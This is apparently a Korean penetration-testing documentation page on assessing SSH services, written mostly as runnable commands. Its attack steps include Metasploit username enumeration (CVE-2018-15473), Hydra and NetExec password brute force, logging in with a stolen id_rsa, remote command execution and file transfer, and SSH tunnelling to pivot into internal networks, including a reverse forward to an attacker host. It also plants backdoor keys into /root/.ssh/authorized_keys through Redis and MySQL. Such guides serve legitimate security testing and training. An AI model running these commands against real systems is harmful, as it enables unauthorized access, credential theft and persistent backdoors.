---
sidebar_position: 2
title: SSH (Port 22)
---

# SSH (Port 22) 취약점 진단

## Overview

**SSH (Secure Shell)**: 암호화된 원격 접속 프로토콜. 관리 목적으로 가장 널리 사용되며 주요 공격 대상 중 하나

**인증 방식**:
1. 공개키/개인키 인증 (Key-based) - 권장
2. 비밀번호 인증 (Password-based) - 취약점 존재 가능

**일반적인 SSH 서버 데몬**:
- OpenSSH, Dropbear, Tectia SSH

---

## Assessment Checklist

- [ ] **비밀번호 인증 활성화 유무**: 키 기반 인증이 아닌 비밀번호 로그인 가능 시 브루트포스 공격에 취약 여부 점검
- [ ] **사용자 계정 열거 가능 여부**: 구버전(OpenSSH < 7.7)에서 유효한 사용자 이름(Username Enumeration) 확인 가능 여부
- [ ] **취약한 비밀번호 정책**: 짧거나 디폴트 비밀번호 사용 및 실패 시 계정 잠금 정책 부재 점검
- [ ] **구버전 취약점 및 약한 알고리즘**: 알려진 취약점(CVE) 존재 및 약한 암호화 알고리즘 허용 여부

---

## 1. Reconnaissance

### 서비스 및 버전 스캔
```bash
# 기본 버전 정보 및 포트 스캔
nmap -p 22 -sV <target>

# SSH 관련 NSE 스크립트 실행
nmap -p 22 -sV -sC <target>

# 비표준 포트 지정 스캔 (2222, 2200 등)
nmap -p 22,2222,2200,22222 -sV <target>
```

### NSE 스크립트 활용
```bash
# 서버에서 지원하는 인증 방법 확인 (publickey, password 등)
nmap -p 22 --script ssh-auth-methods <target>

# 호스트 키 정보 확인
nmap -p 22 --script ssh-hostkey <target>

# 약한 암호화 알고리즘 사용 여부 점검
nmap -p 22 --script ssh2-enum-algos <target>
```

---

## 2. Exploitation

### 사용자 열거 (User Enumeration)
OpenSSH 버전이 7.7 미만인 경우, 유효한 계정을 찾아낼 수 있음 (CVE-2018-15473)
```bash
# Metasploit을 이용한 사용자 이름 열거
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts <target>
set user_file /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run
```

### 브루트포스 공격 (Brute-Force)
비밀번호 인증이 켜져 있을 때 약한 암호를 추측하는 공격
```bash
# [Hydra] 단일 유저(root) 대상 비밀번호 브루트포스
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -V -f

# [NetExec] 다중 유저/패스워드 브루트포스 및 동시 접속 테스트
netexec ssh <target> -u users.txt -p passwords.txt
```

### SSH 개인키 탈취 및 재활용
LFI 파일 읽기 취약점 등으로 `id_rsa`를 탈취한 경우 이를 이용한 접속
```bash
# 1. 탈취한 키 포맷 수정 및 권한 설정 (권한 600 필수)
dos2unix id_rsa
chmod 600 id_rsa

# 2. 개인키를 사용한 접속 (필요 시 약한 알고리즘 강제 지정)
ssh -i id_rsa <user>@<target>
ssh -i id_rsa <user>@<target> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

### 원격 명령 실행 및 파일 처리
```bash
# [NetExec] 크리덴셜 확인 후 즉각적인 OS 명령어 실행
netexec ssh <target> -u '<user>' -p '<pass>' -x "whoami"

# [NetExec] 파일 다운로드 및 업로드
netexec ssh <target> -u '<user>' -p '<pass>' --get-file /remote/path/file.txt local_file.txt
netexec ssh <target> -u '<user>' -p '<pass>' --put-file local_file.txt /remote/path/file.txt
```

---

## 3. Advanced Techniques

### SSH 터널링 (Port Forwarding & Proxy)
SSH 접속 권한을 획득하면 해당 서버를 경유지(Pivot)로 사용하여 내부망에 접근 가능

**Local Port Forwarding (단일 포트 터널링)**
```bash
# 타겟 서버(10.10.100.20)를 경유하여 내부망(172.16.50.10)의 445 포트를 로컬 4455 포트로 포워딩
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <user>@10.10.100.20

# 활용 예시 (로컬 포트로 SMB 접속)
smbclient -p 4455 //127.0.0.1/share -U <user>
```

**Dynamic Port Forwarding (SOCKS 프록시)**
```bash
# 동적 포워딩을 통한 로컬 9999 포트 SOCKS 프록시 생성
ssh -N -D 0.0.0.0:9999 <user>@10.10.100.20

# /etc/proxychains4.conf 에 'socks5 127.0.0.1 9999' 추가 후 도구 실행
proxychains nmap -sT -Pn <internal_ip>
```

**Remote Port Forwarding (리버스 포워딩)**
방화벽으로 외부 접속이 막힌 피해자(Victim) 서버에서 공격자(Attacker) 로컬 서버로 터널링
```bash
# 원격 서버 내부망의 포트를 공격자 로컬 포트로 오픈
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <attacker>@<attacker_ip>
```

### sshuttle (VPN over SSH)
루팅 없이 SSH 기반의 임시 VPN 터널을 생성하여 내부망 라우팅 추가
```bash
# 내부망 대역(10.10.100.0/24)을 SSH 라우팅으로 연결
sshuttle -r <user>@10.10.10.10 10.10.100.0/24
```

### SSH Key 삽입 우회 기법 (Redis/MySQL)
기타 서비스(Redis, DB 등) 취약점을 통해 SSH 접속 백도어 설치
```bash
# [Redis] 공격자 공개키를 변수(s-key)에 넣고 authorized_keys 로 덤프
cat /tmp/spub.txt | redis-cli -h <target> -x set s-key
redis-cli -h <target>
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> save

# [MySQL] FILE 권한을 이용한 공개키 덤프
SELECT "<SSH_PUBLIC_KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '\n';
```

---

## 4. Post-Exploitation

### 설정 파일 및 로그 점검
루트 권한 획득 후 추가적인 시스템 이해 및 패스워드 재사용 여부 확인

**SSH 설정 파일 위치:**
- 서버 설정: `/etc/ssh/sshd_config` (루트 로그인, 키 인증 허용 여부)
- 클라이언트 설정: `/etc/ssh/ssh_config`, `~/.ssh/config`

**SSH 키 관리 폴더:**
- 개인키: `~/.ssh/id_rsa`
- 인가된 외부 공개키: `~/.ssh/authorized_keys`, `~/.ssh/authorized_keys2`
- 접속했던 호스트 기록: `~/.ssh/known_hosts`

**연결 로그(Auth Log):**
- Debian/Ubuntu: `/var/log/auth.log`
- RHEL/CentOS: `/var/log/secure`
